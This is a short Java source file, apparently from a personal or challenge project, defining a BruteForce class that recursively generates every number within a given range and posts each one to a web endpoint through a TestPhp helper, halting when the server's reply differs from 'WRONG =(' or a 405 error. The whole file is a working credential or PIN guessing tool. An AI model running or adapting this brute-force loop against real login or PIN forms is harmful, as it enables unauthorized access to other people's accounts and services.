package ua.bulovackiy.brute;

import ua.bulovackiy.connection.TestPhp;

/**
 * Class for bust values.
 *
 * @author Evgeniy Bulovackiy
 * @version 1.0
 */

public class BruteForce {
    private char[] numbers = new char[]{'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
    private int count = 0;
    private String result;
    private TestPhp testPhp = new TestPhp();

    public void bust(String startValue, String endValue, String element) {

        if (count == 0) {
            count = endValue.length()-1;
        }

        for (Character c : numbers) {

            if (element.equals("")){
                result = c.toString();
            } else {
                result = element + c.toString();
            }

            if (Integer.parseInt(result)>=Integer.parseInt(startValue)
                    &&Integer.parseInt(result)<=Integer.parseInt(endValue)){
                String test = testPhp.post(result);
                //System.out.println(result);
                System.out.println(test+" -> "+result);
                if(!test.equals("WRONG =(")&&!test.equals("405 Not Allowed nginx/1.12.0")){
                    System.out.println(test);
                    System.exit(0);
                }
            }

            for (int i = count; i > 0;) {
                if (result.length()>endValue.length()-1){
                    break;
                }
                count--;
                bust(startValue, endValue, result);
            }

        }
    }



}
